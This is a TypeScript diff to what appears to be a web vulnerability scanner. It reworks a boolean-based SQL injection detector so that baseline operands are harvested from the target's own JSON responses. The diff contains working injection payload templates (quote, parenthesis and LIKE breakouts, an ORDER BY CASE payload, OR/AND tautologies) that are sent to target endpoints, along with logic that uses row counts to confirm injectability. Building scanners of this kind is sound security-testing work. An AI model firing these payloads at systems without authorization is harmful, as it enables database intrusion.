@@ -36,11 +36,147 @@ export const templateSyntaxes: Array<{ engine: string; format: (a: number, b: nu
 
 
 
+// ---------------------------------------------------------------------------------------------
+// Baseline grounding for SQL predicates
+// ---------------------------------------------------------------------------------------------
+
+const groundTextField = /^(?:title|name|label|subject|headline|display_?name|slug|q|query|term|keyword|username|email|city|category|sku|code|status)$/i
+const groundOpaqueField = /^(?:id|uuid|uid|external_?id|[a-z0-9]*_id|url|uri|href|link|image|avatar|photo|thumbnail|icon|html|body|description|token|secret|password|hash|signature|created_?at|updated_?at|date|time|timestamp|expires?_?at)$/i
+const groundSafeValue = /^[A-Za-z0-9][A-Za-z0-9 ._@:/'-]{2,47}$/
+const groundCollectionKey = /results|items|rows|data|records|list|hits|entries|nodes|objects|docs|products|projects|users|orders|posts|articles|collection/i
+
+export interface GroundTerms {
+  /** Literal string operands harvested from result rows, most searchable first. */
+  text: string[]
+  /** Positive integer operands (ids/prices/quantities) for numeric predicates. */
+  numeric: string[]
+}
+
+/**
+ * Harvest literal operands from a benign JSON collection response. A boolean SQLi pair must lead
+ * with a value the target's own data actually contains: `title LIKE '%<term>%'` only yields the
+ * baseline rows for the true arm when `<term>` exists in the catalog. A dev fixture word or seed
+ * literal is not portable across catalogs, so grounding comes from the response itself.
+ */
+export function extractGroundTerms(body: string): GroundTerms {
+  let parsed: unknown
+  try { parsed = JSON.parse(body) } catch { return { text: [], numeric: [] } }
+  const rows: Array<{ row: Record<string, unknown>; collection: boolean }> = []
+  const visit = (node: unknown, depth: number, key: string): void => {
+    if (!node || typeof node !== 'object' || depth > 4) return
+    if (Array.isArray(node)) {
+      const collection = groundCollectionKey.test(key)
+      for (const entry of node.slice(0, 8)) {
+        if (entry && typeof entry === 'object' && !Array.isArray(entry)) {
+          rows.push({ row: entry as Record<string, unknown>, collection })
+        } else if (typeof entry === 'string') {
+          rows.push({ row: { value: entry }, collection })
+        }
+      }
+      return
+    }
+    for (const [childKey, child] of Object.entries(node as Record<string, unknown>)) visit(child, depth + 1, childKey)
+  }
+  visit(parsed, 0, '')
+  rows.sort((a, b) => Number(b.collection) - Number(a.collection))
+  const text: string[] = []
+  const numeric: string[] = []
+  for (const { row } of rows) {
+    for (const [key, value] of Object.entries(row)) {
+      if (typeof value === 'number' && Number.isInteger(value) && value > 0 && value < 1_000_000_000) {
+        const n = String(value)
+        if (!numeric.includes(n)) numeric.push(n)
+        continue
+      }
+      if (typeof value !== 'string') continue
+      if (groundOpaqueField.test(key) && !groundTextField.test(key)) continue
+      const clean = value.trim().replace(/\s+/g, ' ')
+      if (!groundSafeValue.test(clean)) continue
+      if (!/[A-Za-z]/.test(clean)) continue
+      if (/['"\\%;<>\u0000-\u001f]/.test(clean) || clean.includes('--') || clean.includes('/*')) continue
+      const words = clean.split(' ')
+      const forms = [clean]
+      if (words.length > 1) forms.push(words.slice(-2).join(' '), words[words.length - 1]!, words.slice(0, 2).join(' '))
+      forms.push(words[0]!)
+      for (const form of forms) {
+        if (form.length < 3 || form.length > 48) continue
+        if (!text.includes(form)) text.push(form)
+      }
+    }
+  }
+  return { text: text.slice(0, 12), numeric: numeric.slice(0, 4) }
+}
+
+/** First harvested operand, preferring one already visible in the declared baseline body. */
+export function pickGroundTerm(body: string, baselineBody?: string): string | null {
+  const { text } = extractGroundTerms(body)
+  if (text.length === 0) return null
+  if (baselineBody) {
+    const preferred = text.find(term => baselineBody.includes(term))
+    if (preferred) return preferred
+  }
+  return text[0]!
+}
+
 export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
   const { req, send, anomalies } = ctx
-  const baseValue = req.baselineValue ?? '1'
-  const baseA = await send(injectParam(req, baseValue))
-  const baseB = await send(injectParam(req, baseValue))
+  const declaredBase = req.baselineValue ?? '1'
+
+  // Ground the pair before probing: one benign request with a neutral/empty term. If the response
+  // yields a literal operand, both the baseline and the true arm lead with it so the LIKE/equality
+  // prefix matches the target's own rows. If the empty term returns no rows but the caller's
+  // baseline does, that baseline is already response-grounded and is kept. Only when neither
+  // matches does the pair degrade to the tautology (`' OR '1'='1` vs `' AND '1'='2`) — never to a
+  // blind seed/app literal.
+  const benign = await send(injectParam(req, ''))
+  const benignOk = Boolean(benign && benign.status >= 200 && benign.status < 300)
+  const benignRows = benign ? countRecords(benign.body) : null
+  const ground = benignOk ? extractGroundTerms(benign!.body) : { text: [], numeric: [] }
+  const harvested = ground.text[0] ?? null
+  const declaredSafe = declaredBase.length >= 3 && declaredBase.length <= 48 &&
+    !/['"\\%;<>\u0000-\u001f]/.test(declaredBase) && !declaredBase.includes('--')
+  let groundTerm = harvested
+  let groundSource: 'harvested' | 'declared' | 'tautology' | 'caller' = harvested !== null ? 'harvested' : 'tautology'
+  let baseValue: string
+  let baseA: BrokerExchangeResult | null
+  let baseB: BrokerExchangeResult | null
+  if (harvested !== null) {
+    baseValue = harvested
+    baseA = await send(injectParam(req, baseValue))
+    baseB = await send(injectParam(req, baseValue))
+  } else if (benignOk && benignRows !== null && benignRows > 0) {
+    // The neutral term itself returns the collection, so it is a valid non-seed anchor.
+    baseValue = ''
+    baseA = benign
+    baseB = await send(injectParam(req, ''))
+  } else if (benignOk && benignRows !== null && declaredSafe) {
+    // Empty term matches nothing (equality/numeric sink); keep the caller's baseline only when it
+    // demonstrably returns rows on this target.
+    const declaredProbe = await send(injectParam(req, declaredBase))
+    const declaredRows = declaredProbe ? countRecords(declaredProbe.body) : null
+    if (declaredProbe && declaredRows !== null && declaredRows > 0) {
+      groundTerm = declaredBase
+      groundSource = 'declared'
+      baseValue = declaredBase
+      baseA = declaredProbe
+      baseB = await send(injectParam(req, declaredBase))
+    } else {
+      baseValue = ''
+      baseA = benign
+      baseB = await send(injectParam(req, ''))
+    }
+  } else if (benignOk) {
+    baseValue = ''
+    baseA = benign
+    baseB = await send(injectParam(req, ''))
+  } else {
+    // Non-JSON or failed neutral probe: keep the caller's value (opaque carriers have no catalog).
+    groundSource = 'caller'
+    baseValue = declaredBase
+    baseA = await send(injectParam(req, baseValue))
+    baseB = await send(injectParam(req, baseValue))
+  }
+  const numericBase = ground.numeric[0] ?? (/^\d{1,9}$/.test(declaredBase) ? declaredBase : null)
   if (!baseA || !baseB) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }
 
   const baselineDialect = dbErrorDialect(baseA.body)
@@ -63,19 +199,43 @@ export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOut
     }
   }
 
-  // Expanded 9-pattern boolean/syntax matrix. LIKE-wrapped sinks are common (search boxes), so the
-  // `%` breakout runs early; the remaining shapes are only worth their requests when the response
-  // has already shown it reacts to syntax.
-  const styles: Array<{ name: string; orBranch?: boolean; make: (k: number, truth: boolean) => string }> = [
-    { name: 'single_quote', make: (k, t) => `${baseValue}' AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'single_paren', make: (k, t) => `${baseValue}') AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'like_breakout', make: (k, t) => `${baseValue}%' AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'or_branch', orBranch: true, make: (k, t) => `${baseValue}' OR ${k}=${t ? k : k + 1}-- -` },
-    { name: 'numeric', make: (k, t) => `${baseValue} AND ${k}=${t ? k : k + 1}` },
-    { name: 'double_quote', make: (k, t) => `${baseValue}" AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'single_double_paren', make: (k, t) => `${baseValue}')) AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'order_by', make: (k, t) => `${baseValue} ORDER BY (CASE WHEN (${k}=${t ? k : k + 1}) THEN 1 ELSE 2 END)-- -` },
+  // Expanded style matrix. LIKE-wrapped sinks are common (search boxes), so the `%` breakout runs
+  // early. Every shape that embeds a leading operand uses the grounded baseline; the numeric shape
+  // additionally requires a numeric operand from the same response (never a bare seed number).
+  type SqlBooleanStyle = {
+    name: string
+    orBranch?: boolean
+    quoteStyle: 'single' | 'double' | 'numeric'
+    template: string
+  }
+  const groundedStyles: SqlBooleanStyle[] = [
+    { name: 'single_quote', quoteStyle: 'single', template: "{{baseline}}' AND {{sql_expr}}-- -" },
+    { name: 'single_paren', quoteStyle: 'single', template: "{{baseline}}') AND {{sql_expr}}-- -" },
+    { name: 'like_breakout', quoteStyle: 'single', template: "{{baseline}}%' AND {{sql_expr}}-- -" },
+    { name: 'or_branch', orBranch: true, quoteStyle: 'single', template: "{{baseline}}' OR {{sql_expr}}-- -" },
+    ...(numericBase ? [{ name: 'numeric', quoteStyle: 'numeric' as const, template: '{{baseline}} AND {{sql_expr}}' }] : []),
+    { name: 'double_quote', quoteStyle: 'double', template: '{{baseline}}" AND {{sql_expr}}-- -' },
+    { name: 'single_double_paren', quoteStyle: 'single', template: "{{baseline}}')) AND {{sql_expr}}-- -" },
+    { name: 'order_by', quoteStyle: 'single', template: '{{baseline}} ORDER BY (CASE WHEN ({{sql_expr}}) THEN 1 ELSE 2 END)-- -' },
   ]
+  // No harvested operand: prove the predicate is injectable with the tautology pair. The true arm
+  // keeps the collection (`LIKE '%' OR '1'='1`), the false arm drops it (`AND '1'='2`).
+  const tautologyStyle: SqlBooleanStyle = { name: 'tautology', orBranch: true, quoteStyle: 'single', template: "{{baseline}}' AND {{sql_expr}}-- -" }
+  // The detection pair switches operator (OR true / AND false), which one replay template cannot
+  // express. Replay the equivalent single-template pair for the sink: a LIKE/collection baseline
+  // (rows on an empty term) keeps rows with `' AND k=k`; an equality/numeric sink that returned no
+  // rows on an empty term needs the OR branch to keep its rows.
+  const tautologyReplayTemplate = (countRecords(baseA.body) ?? 0) > 0
+    ? "{{baseline}}' AND {{sql_expr}}-- -"
+    : "{{baseline}}' OR {{sql_expr}}-- -"
+  const styles: SqlBooleanStyle[] = groundTerm === null ? [tautologyStyle, ...groundedStyles] : groundedStyles
+  const specTemplateOf = (style: SqlBooleanStyle): string =>
+    style.name === 'tautology' ? tautologyReplayTemplate : style.template
+  const makePayload = (style: SqlBooleanStyle, base: string, k: number, truth: boolean): string => {
+    if (style.name === 'tautology') return truth ? `${base}' OR '1'='1` : `${base}' AND '1'='2`
+    const expr = `${k}=${truth ? k : k + 1}`
+    return style.template.replaceAll('{{baseline}}', base).replaceAll('{{sql_expr}}', expr)
+  }
   const signals: Array<Record<string, unknown>> = []
   let divergentStyles = 0
   let stylesRun = 0
@@ -85,13 +245,15 @@ export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOut
     // (including the OR branch, which proves non-LIKE sinks without a baseline) are enough evidence.
     if (stylesRun >= 4 && divergentStyles === 0) break
     stylesRun += 1
+    const styleBase = style.name === 'numeric' ? (numericBase ?? baseValue) : baseValue
+    const baselineRows = countRecords(baseA.body)
     const rounds: Array<Record<string, unknown>> = []
     let pass = true
     for (let r = 0; r < 2; r += 1) {
       if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
       const k = randomInt(1000, 9999)
-      const tVal = style.make(k, true)
-      const fVal = style.make(k, false)
+      const tVal = makePayload(style, styleBase, k, true)
+      const fVal = makePayload(style, styleBase, k, false)
       const t = await send(injectParam(req, tVal))
       checkDbError(t)
       if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
@@ -109,18 +271,41 @@ export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOut
       const simBaseFalse = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(f.body, [fVal, baseValue]))
       const simTrueFalse = responseSimilarity(scrub(t.body, [tVal, baseValue]), scrub(f.body, [fVal, baseValue]))
       const statusDiverges = t.status === baseA.status && f.status !== t.status && f.status < 500
+      // Both arms must be successful, the true arm must keep the baseline's rows (when the baseline
+      // had any), and the separation must be visible in rows or body — a status-only delta is not a
+      // boolean oracle.
+      const trueRows = countRecords(t.body)
+      const falseRows = countRecords(f.body)
+      const rowsComparable = trueRows !== null && falseRows !== null
+      const baselineHadRows = baselineRows !== null && baselineRows > 0
+      const trueNonEmptyOk = !baselineHadRows || (trueRows !== null && trueRows > 0)
+      const contentSeparates = simTrueFalse <= 0.75
+      const rowSeparates = rowsComparable && trueRows !== falseRows
+      const arms2xx = t.status >= 200 && t.status < 300 && f.status >= 200 && f.status < 300
+      const separationOk = rowsComparable ? (contentSeparates || rowSeparates) : (contentSeparates || statusDiverges)
       if (simBaseTrue < 0.98 || simBaseFalse < 0.98 || t.status !== baseA.status || f.status !== baseA.status) divergentStyles += 1
-      const roundPass = style.orBranch
-        ? (t.status < 500 && f.status < 500 && Math.max(simBaseTrue, simBaseFalse) >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
-        : (t.status < 500 && f.status < 500 && simBaseTrue >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
-      rounds.push({ k, statusBase: baseA.status, statusTrue: t.status, statusFalse: f.status, simBaseTrue, simTrueFalse, roundPass })
+      const baselineMatch = style.orBranch
+        ? Math.max(simBaseTrue, simBaseFalse) >= 0.9
+        : simBaseTrue >= 0.9
+      const roundPass = arms2xx && trueNonEmptyOk && baselineMatch && separationOk
+      rounds.push({
+        k, statusBase: baseA.status, statusTrue: t.status, statusFalse: f.status,
+        rowsBase: baselineRows, rowsTrue: trueRows, rowsFalse: falseRows,
+        simBaseTrue, simBaseFalse, simTrueFalse, roundPass,
+      })
       if (!roundPass) { pass = false; break }
     }
     const passed = pass && rounds.length === 2
-    signals.push({ style: style.name, passed, rounds })
+    signals.push({
+      style: style.name,
+      baselineValue: styleBase,
+      quoteStyle: style.quoteStyle,
+      valueTemplate: specTemplateOf(style),
+      passed,
+      rounds,
+    })
     if (passed) break
   }
-
   let unionSignal: Record<string, unknown> | null = null
   const interesting = divergentStyles > 0 || Boolean(detectedErrorDialect)
   if (!signals.some(s => s.passed) && interesting && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2)) {
@@ -156,6 +341,11 @@ export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOut
   const errorDialect = detectedErrorDialect ?? (quoteOne ? dbErrorDialect(quoteOne.body) : null)
   const details: Record<string, unknown> = {
     baselineStable: baseA.bodySha256 === baseB.bodySha256 || responseSimilarity(baseA.body, baseB.body) >= 0.98,
+    baselineValue: baseValue,
+    baselineSource: groundSource,
+    groundedBaselineValue: groundTerm,
+    benignStatus: benign ? benign.status : null,
+    baselineRows: countRecords(baseA.body),
     booleanSignals: signals,
     dbErrorDialect: errorDialect && errorDialect !== baselineDialect ? errorDialect : null,
     quoteDelta: quoteOne && quoteTwo
@@ -163,12 +353,30 @@ export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOut
       : null,
   }
   const passed = signals.find(s => s.passed)
+  const anyTrueArmRows = signals.some(s =>
+    Array.isArray(s.rounds) && (s.rounds as Array<Record<string, unknown>>).some(r => typeof r.rowsTrue === 'number' && r.rowsTrue > 0))
+  const ranAnyRound = signals.some(s => Array.isArray(s.rounds) && s.rounds.length > 0)
   let summary = 'No boolean or error differential observed.'
   let verdict: DiffOutcome['verdict'] = 'no_signal'
   if (passed) {
     verdict = 'signal'
-    summary = `Boolean differential (${String(passed.style)}) held across randomized rounds: equal-comparison matches baseline, unequal-comparison diverges.`
-    anomalies.push({ type: 'boolean_differential', style: passed.style, rounds: passed.rounds ?? passed.results })
+    const groundNote = groundTerm !== null ? ` grounded on response operand "${groundTerm}"` : ''
+    summary = `Boolean differential (${String(passed.style)}) held across randomized rounds${groundNote}: equal-comparison matches baseline rows, unequal-comparison diverges.`
+    // Legacy spec builders replay `style` against the caller's own baseline. The tautology pair
+    // (OR true / AND false) has no single-template replay, so expose the equivalent OR branch; all
+    // other proven shapes keep their own name. The exact proven pair travels in
+    // `provenStyle`/`baselineValue`/`valueTemplate` for builders that read it.
+    const provenStyle = String(passed.style)
+    const legacyStyle = provenStyle === 'tautology' ? 'or_branch' : provenStyle
+    anomalies.push({
+      type: 'boolean_differential',
+      style: legacyStyle,
+      provenStyle,
+      baselineValue: passed.baselineValue,
+      quoteStyle: passed.quoteStyle,
+      valueTemplate: passed.valueTemplate,
+      rounds: passed.rounds ?? passed.results,
+    })
   }
   if (details.dbErrorDialect) {
     verdict = 'signal'
@@ -176,6 +384,12 @@ export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOut
     if (!anomalies.some(a => a.type === 'db_error_fingerprint')) {
       anomalies.push({ type: 'db_error_fingerprint', dialect: details.dbErrorDialect })
     }
+  }
+  // No arm reproduced rows on a sink that answered the probe: a probe-precondition failure (e.g.
+  // the operand is not reachable through this sink), not a clean negative and never a pass.
+  if (verdict === 'no_signal' && ranAnyRound && !anyTrueArmRows) {
+    verdict = 'inconclusive'
+    summary = 'Every boolean arm returned no rows; the operand could not be grounded through this sink.'
   }
   return { verdict, summary, details }
 }
